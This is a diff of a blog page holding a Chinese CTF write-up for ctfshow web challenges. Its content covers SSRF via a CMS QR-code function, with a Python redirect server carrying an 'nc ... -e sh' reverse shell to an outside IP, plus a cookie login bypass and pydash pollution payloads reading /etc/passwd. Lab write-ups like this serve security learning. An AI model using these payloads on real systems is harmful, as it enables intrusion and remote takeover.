@@ -20,22 +20,22 @@
 <meta property="og:site_name" content="TYBOYKALI&#39;s Blog">
 <meta property="og:description" content="easycms题目提示存在&#x2F;flag.php,内容 123456if($_SERVER[&quot;REMOTE_ADDR&quot;] !&#x3D; &quot;127.0.0.1&quot;)&#123;   echo &quot;Just input &#x27;cmd&#x27; From 127.0.0.1&quot;;   return;&#125;else&#123;   syst">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="c:\Users\TYKAL\AppData\Roaming\Typora\typora-user-images\image-20260912194352992.png">
-<meta property="og:image" content="c:\Users\TYKAL\AppData\Roaming\Typora\typora-user-images\image-20260912194447097.png">
-<meta property="og:image" content="c:\Users\TYKAL\AppData\Roaming\Typora\typora-user-images\image-20260912200916821.png">
-<meta property="og:image" content="c:\Users\TYKAL\AppData\Roaming\Typora\typora-user-images\image-20260914201716419.png">
-<meta property="og:image" content="c:\Users\TYKAL\AppData\Roaming\Typora\typora-user-images\image-20260914210721948.png">
-<meta property="og:image" content="c:\Users\TYKAL\AppData\Roaming\Typora\typora-user-images\image-20260915194016386.png">
-<meta property="og:image" content="c:\Users\TYKAL\AppData\Roaming\Typora\typora-user-images\image-20260915204341758.png">
-<meta property="og:image" content="c:\Users\TYKAL\AppData\Roaming\Typora\typora-user-images\image-20260915203511543.png">
-<meta property="og:image" content="c:\Users\TYKAL\AppData\Roaming\Typora\typora-user-images\image-20260915204959751.png">
-<meta property="og:image" content="c:\Users\TYKAL\AppData\Roaming\Typora\typora-user-images\image-20260915205116440.png">
+<meta property="og:image" content="https://tyboykali.github.io/images/image-20260912194352992.png">
+<meta property="og:image" content="https://tyboykali.github.io/images/image-20260912194447097.png">
+<meta property="og:image" content="https://tyboykali.github.io/images/image-20260912200916821.png">
+<meta property="og:image" content="https://tyboykali.github.io/images/image-20260914201716419.png">
+<meta property="og:image" content="https://tyboykali.github.io/images/image-20260914210721948.png">
+<meta property="og:image" content="https://tyboykali.github.io/images/image-20260915194016386.png">
+<meta property="og:image" content="https://tyboykali.github.io/images/image-20260915204341758.png">
+<meta property="og:image" content="https://tyboykali.github.io/images/image-20260915203511543.png">
+<meta property="og:image" content="https://tyboykali.github.io/images/image-20260915204959751.png">
+<meta property="og:image" content="https://tyboykali.github.io/images/image-20260915205116440.png">
 <meta property="article:published_time" content="2026-09-24T16:00:00.000Z">
-<meta property="article:modified_time" content="2026-09-25T07:48:07.146Z">
+<meta property="article:modified_time" content="2026-09-25T07:53:16.326Z">
 <meta property="article:author" content="TYBOYKALI">
 <meta property="article:tag" content="CTF, Web Security, Security Research, Notes">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="c:\Users\TYKAL\AppData\Roaming\Typora\typora-user-images\image-20260912194352992.png">
+<meta name="twitter:image" content="https://tyboykali.github.io/images/image-20260912194352992.png">
   
   
   
@@ -1428,12 +1428,12 @@ body:has(#container.mobile-nav-on) #player-playlist {
     <div class="e-content article-entry" itemprop="articleBody">
       
         <h3 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h3><p>题目提示存在&#x2F;flag.php,内容</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;Just input &#x27;cmd&#x27; From 127.0.0.1&quot;</span>;</span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="title function_ invoke__">system</span>($\_GET[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;Just input &#x27;cmd&#x27; From 127.0.0.1&quot;</span>;</span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>使用dirsearch扫描得到test.php</p>
-<p><img src="C:\Users\TYKAL\AppData\Roaming\Typora\typora-user-images\image-20260912194352992.png" alt="image-20260912194352992"></p>
+<p><img src="/images/image-20260912194352992.png" alt="image-20260912194352992"></p>
 <p>访问得到CMS版本：V4.6.2</p>
-<p><img src="C:\Users\TYKAL\AppData\Roaming\Typora\typora-user-images\image-20260912194447097.png" alt="image-20260912194447097"></p>
+<p><img src="/images/image-20260912194447097.png" alt="image-20260912194447097"></p>
 <p>从网上得知这个版本存在ssrf漏洞</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">qrcode</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$value</span> = <span class="title function_ invoke__">urldecode</span>(<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;text&#x27;</span>));</span><br><span class="line">    <span class="variable">$thumb</span> = <span class="title function_ invoke__">urldecode</span>(<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;thumb&#x27;</span>));</span><br><span class="line">    <span class="variable">$matrixPointSize</span> = (<span class="keyword">int</span>)<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;size&#x27;</span>);</span><br><span class="line">    <span class="variable">$errorCorrectionLevel</span> = <span class="title function_ invoke__">dr_safe_replace</span>(<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;level&#x27;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//生成二维码图片</span></span><br><span class="line">    <span class="keyword">require_once</span> CMSPATH.<span class="string">&#x27;Library/Phpqrcode.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$file</span> = WRITEPATH.<span class="string">&#x27;file/qrcode-&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>.<span class="variable">$thumb</span>.<span class="variable">$matrixPointSize</span>.<span class="variable">$errorCorrectionLevel</span>).<span class="string">&#x27;-qrcode.png&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="variable">$QR</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title class_">\QRcode</span>::<span class="title function_ invoke__">png</span>(<span class="variable">$value</span>, <span class="variable">$file</span>, <span class="variable">$errorCorrectionLevel</span>, <span class="variable">$matrixPointSize</span>, <span class="number">3</span>);</span><br><span class="line">        <span class="variable">$QR</span> = <span class="title function_ invoke__">imagecreatefromstring</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$thumb</span>) &#123;</span><br><span class="line">            <span class="variable">$logo</span> = <span class="title function_ invoke__">imagecreatefromstring</span>(<span class="title function_ invoke__">dr_catcher_data</span>(<span class="variable">$thumb</span>));</span><br><span class="line">            <span class="variable">$QR_width</span> = <span class="title function_ invoke__">imagesx</span>(<span class="variable">$QR</span>);<span class="comment">//二维码图片宽度</span></span><br><span class="line">            <span class="variable">$QR_height</span> = <span class="title function_ invoke__">imagesy</span>(<span class="variable">$QR</span>);<span class="comment">//二维码图片高度</span></span><br><span class="line">            <span class="variable">$logo_width</span> = <span class="title function_ invoke__">imagesx</span>(<span class="variable">$logo</span>);<span class="comment">//logo图片宽度</span></span><br><span class="line">            <span class="variable">$logo_height</span> = <span class="title function_ invoke__">imagesy</span>(<span class="variable">$logo</span>);<span class="comment">//logo图片高度</span></span><br><span class="line">            <span class="variable">$logo_qr_width</span> = <span class="variable">$QR_width</span> / <span class="number">4</span>;</span><br><span class="line">            <span class="variable">$scale</span> = <span class="variable">$logo_width</span>/<span class="variable">$logo_qr_width</span>;</span><br><span class="line">            <span class="variable">$logo_qr_height</span> = <span class="variable">$logo_height</span>/<span class="variable">$scale</span>;</span><br><span class="line">            <span class="variable">$from_width</span> = (<span class="variable">$QR_width</span> - <span class="variable">$logo_qr_width</span>) / <span class="number">2</span>;</span><br><span class="line">            <span class="comment">//重新组合图片并调整大小</span></span><br><span class="line">            <span class="title function_ invoke__">imagecopyresampled</span>(<span class="variable">$QR</span>, <span class="variable">$logo</span>, <span class="variable">$from_width</span>, <span class="variable">$from_width</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="variable">$logo_qr_width</span>, <span class="variable">$logo_qr_height</span>, <span class="variable">$logo_width</span>, <span class="variable">$logo_height</span>);</span><br><span class="line">            <span class="title function_ invoke__">imagepng</span>(<span class="variable">$QR</span>, <span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出图片</span></span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">    <span class="title function_ invoke__">ob_clean</span>();</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: image/png&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">ImagePng</span>(<span class="variable">$QR</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -1448,7 +1448,7 @@ body:has(#container.mobile-nav-on) #player-playlist {
 
 <p>可以让服务器发送网络请求</p>
 <p>配合服务器上的flag.php，利用反弹shell实现命令执行</p>
-<p><img src="C:\Users\TYKAL\AppData\Roaming\Typora\typora-user-images\image-20260912200916821.png" alt="image-20260912200916821"></p>
+<p><img src="/images/image-20260912200916821.png" alt="image-20260912200916821"></p>
 <p>创建302文件让靶机访问即可getshell</p>
 <p>这里注意vps需要有php环境，否则没法触发重定向，或者可以使用python触发</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Handler</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.send_response(<span class="number">302</span>)</span><br><span class="line">        <span class="variable language_">self</span>.send_header(</span><br><span class="line">            <span class="string">&quot;Location&quot;</span>,</span><br><span class="line">            <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span></span><br><span class="line">            <span class="string">&quot;?cmd=nc%20101.32.44.55%207714%20-e%20sh&quot;</span></span><br><span class="line">        )</span><br><span class="line">        <span class="variable language_">self</span>.end_headers()</span><br><span class="line"></span><br><span class="line">HTTPServer((<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">7713</span>), Handler).serve_forever()</span><br></pre></td></tr></table></figure>
@@ -1475,7 +1475,7 @@ body:has(#container.mobile-nav-on) #player-playlist {
 
 <p>由于cookie读到;会中断，所以要把他转换为八进制编码</p>
 <p>传入Cookie: user&#x3D;”adm\073n”;</p>
-<p><img src="C:\Users\TYKAL\AppData\Roaming\Typora\typora-user-images\image-20260914201716419.png" alt="image-20260914201716419"></p>
+<p><img src="/images/image-20260914201716419.png" alt="image-20260914201716419"></p>
 <p>登录成功后访问&#x2F;admin路由</p>
 <p>会执行pydash.set，是pydash原型链污染</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&quot;/src&quot;)</span><br><span class="line">async def src(request):</span><br><span class="line">    return text(open(__file__).read())</span><br></pre></td></tr></table></figure>
@@ -1487,8 +1487,8 @@ body:has(#container.mobile-nav-on) #player-playlist {
 <p>代替</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;key&quot;:&quot;.__init__\\\\.__globals__\\\\.__file__&quot;,&quot;value&quot;: &quot;/etc/passwd&quot;&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\TYKAL\AppData\Roaming\Typora\typora-user-images\image-20260914210721948.png" alt="image-20260914210721948"></p>
-<p><img src="C:\Users\TYKAL\AppData\Roaming\Typora\typora-user-images\image-20260915194016386.png" alt="image-20260915194016386"></p>
+<p><img src="/images/image-20260914210721948.png" alt="image-20260914210721948"></p>
+<p><img src="/images/image-20260915194016386.png" alt="image-20260915194016386"></p>
 <p>于是，下一步需要得到flag文件的名字</p>
 <p>注意到&#x2F;static&#x2F;路由</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(&quot;/static/&quot;, &quot;./static/&quot;)</span><br><span class="line">Session(app)</span><br></pre></td></tr></table></figure>
@@ -1509,15 +1509,15 @@ body:has(#container.mobile-nav-on) #player-playlist {
 <p>先把可见改为true</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;,&quot;value&quot;: &quot;True&quot;&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\TYKAL\AppData\Roaming\Typora\typora-user-images\image-20260915204341758.png" alt="image-20260915204341758"></p>
+<p><img src="/images/image-20260915204341758.png" alt="image-20260915204341758"></p>
 <p>再把路径改为根目录</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&quot;,&quot;value&quot;: [&quot;/&quot;]&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\TYKAL\AppData\Roaming\Typora\typora-user-images\image-20260915203511543.png" alt="image-20260915203511543"></p>
+<p><img src="/images/image-20260915203511543.png" alt="image-20260915203511543"></p>
 <p>之后查看&#x2F;static&#x2F;</p>
-<p><img src="C:\Users\TYKAL\AppData\Roaming\Typora\typora-user-images\image-20260915204959751.png" alt="image-20260915204959751"></p>
+<p><img src="/images/image-20260915204959751.png" alt="image-20260915204959751"></p>
 <p>再污染根目录下的flag文件</p>
-<p><img src="C:\Users\TYKAL\AppData\Roaming\Typora\typora-user-images\image-20260915205116440.png" alt="image-20260915205116440"></p>
+<p><img src="/images/image-20260915205116440.png" alt="image-20260915205116440"></p>
 <p>得到答案</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;f57df973-8961-4e5d-850c-a9d8f062a792&#125;</span><br></pre></td></tr></table></figure>
 
@@ -1543,7 +1543,7 @@ body:has(#container.mobile-nav-on) #player-playlist {
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://tyboykali.github.io/2026/09/25/newone/" data-id="cuid7eALrI3kOpLowIhpeqSpe" data-title="newone" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="https://tyboykali.github.io/2026/09/25/newone/" data-id="cuid6MRM_dtm2tuoo2TUVJydz" data-title="newone" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -1805,95 +1805,6 @@ body:has(#container.mobile-nav-on) #player-playlist {
   }
 })();
 </script>
-
-<script>
-(function() {
-  document.querySelectorAll('figure.highlight').forEach(function(block) {
-    var codeNode = block.querySelector('.code pre');
-    if (!codeNode) return;
-
-    var button = document.createElement('button');
-    button.className = 'code-copy-btn';
-    button.type = 'button';
-    button.title = '复制代码';
-    button.setAttribute('aria-label', '复制代码');
-    button.innerHTML = '<span class="fa fa-copy" aria-hidden="true"></span>';
-    block.appendChild(button);
-
-    function setState(state) {
-      var succeeded = state === 'copied';
-      button.classList.toggle('copied', succeeded);
-      button.setAttribute('aria-label', succeeded ? '已复制' : state === 'failed' ? '复制失败' : '复制代码');
-      button.setAttribute('title', succeeded ? '已复制' : state === 'failed' ? '复制失败' : '复制代码');
-      button.innerHTML = '<span class="fa fa-' + (succeeded ? 'check' : state === 'failed' ? 'times' : 'copy') + '" aria-hidden="true"></span>';
-    }
-
-    function fallbackCopy(text) {
-      var textarea = document.createElement('textarea');
-      textarea.value = text;
-      textarea.style.position = 'fixed';
-      textarea.style.opacity = '0';
-      document.body.appendChild(textarea);
-      textarea.select();
-      var copied = document.execCommand('copy');
-      document.body.removeChild(textarea);
-      return copied;
-    }
-
-    button.addEventListener('click', function() {
-      var text = codeNode.textContent;
-      var operation = navigator.clipboard
-        ? navigator.clipboard.writeText(text).then(function() { return true; })
-        : Promise.resolve(fallbackCopy(text));
-
-      operation.then(function(copied) {
-        setState(copied ? 'copied' : 'failed');
-      }).catch(function() {
-        setState(fallbackCopy(text) ? 'copied' : 'failed');
-      }).finally(function() {
-        setTimeout(function() { setState('idle'); }, 1800);
-      });
-    });
-  });
-})();
-</script>
-<style>
-.code-copy-btn {
-  position: absolute;
-  top: 8px;
-  right: 8px;
-  z-index: 10;
-  display: inline-flex;
-  align-items: center;
-  justify-content: center;
-  width: 30px;
-  height: 28px;
-  padding: 0;
-  background: rgba(13, 16, 18, 0.9);
-  border: 1px solid var(--gk-border);
-  border-radius: 3px;
-  color: var(--gk-muted);
-  cursor: pointer;
-  font-size: 11px;
-  opacity: 0.62;
-  transition: color 150ms ease, border-color 150ms ease, opacity 150ms ease;
-}
-
-figure.highlight:hover .code-copy-btn,
-.code-copy-btn:focus-visible {
-  opacity: 1;
-}
-
-.code-copy-btn:hover {
-  border-color: var(--gk-cyan);
-  color: var(--gk-cyan);
-}
-
-.code-copy-btn.copied {
-  border-color: var(--gk-green);
-  color: var(--gk-green);
-}
-</style>
 
 <div id="music-player" role="region" aria-label="音乐播放器">
   <div class="player-row">
@@ -2213,6 +2124,95 @@ figure.highlight:hover .code-copy-btn,
   .article-toc-sidebar {
     display: none;
   }
+}
+</style>
+
+<script>
+(function() {
+  document.querySelectorAll('figure.highlight').forEach(function(block) {
+    var codeNode = block.querySelector('.code pre');
+    if (!codeNode) return;
+
+    var button = document.createElement('button');
+    button.className = 'code-copy-btn';
+    button.type = 'button';
+    button.title = '复制代码';
+    button.setAttribute('aria-label', '复制代码');
+    button.innerHTML = '<span class="fa fa-copy" aria-hidden="true"></span>';
+    block.appendChild(button);
+
+    function setState(state) {
+      var succeeded = state === 'copied';
+      button.classList.toggle('copied', succeeded);
+      button.setAttribute('aria-label', succeeded ? '已复制' : state === 'failed' ? '复制失败' : '复制代码');
+      button.setAttribute('title', succeeded ? '已复制' : state === 'failed' ? '复制失败' : '复制代码');
+      button.innerHTML = '<span class="fa fa-' + (succeeded ? 'check' : state === 'failed' ? 'times' : 'copy') + '" aria-hidden="true"></span>';
+    }
+
+    function fallbackCopy(text) {
+      var textarea = document.createElement('textarea');
+      textarea.value = text;
+      textarea.style.position = 'fixed';
+      textarea.style.opacity = '0';
+      document.body.appendChild(textarea);
+      textarea.select();
+      var copied = document.execCommand('copy');
+      document.body.removeChild(textarea);
+      return copied;
+    }
+
+    button.addEventListener('click', function() {
+      var text = codeNode.textContent;
+      var operation = navigator.clipboard
+        ? navigator.clipboard.writeText(text).then(function() { return true; })
+        : Promise.resolve(fallbackCopy(text));
+
+      operation.then(function(copied) {
+        setState(copied ? 'copied' : 'failed');
+      }).catch(function() {
+        setState(fallbackCopy(text) ? 'copied' : 'failed');
+      }).finally(function() {
+        setTimeout(function() { setState('idle'); }, 1800);
+      });
+    });
+  });
+})();
+</script>
+<style>
+.code-copy-btn {
+  position: absolute;
+  top: 8px;
+  right: 8px;
+  z-index: 10;
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  width: 30px;
+  height: 28px;
+  padding: 0;
+  background: rgba(13, 16, 18, 0.9);
+  border: 1px solid var(--gk-border);
+  border-radius: 3px;
+  color: var(--gk-muted);
+  cursor: pointer;
+  font-size: 11px;
+  opacity: 0.62;
+  transition: color 150ms ease, border-color 150ms ease, opacity 150ms ease;
+}
+
+figure.highlight:hover .code-copy-btn,
+.code-copy-btn:focus-visible {
+  opacity: 1;
+}
+
+.code-copy-btn:hover {
+  border-color: var(--gk-cyan);
+  color: var(--gk-cyan);
+}
+
+.code-copy-btn.copied {
+  border-color: var(--gk-green);
+  color: var(--gk-green);
 }
 </style>
 <!-- hexo injector body_end end --></body>
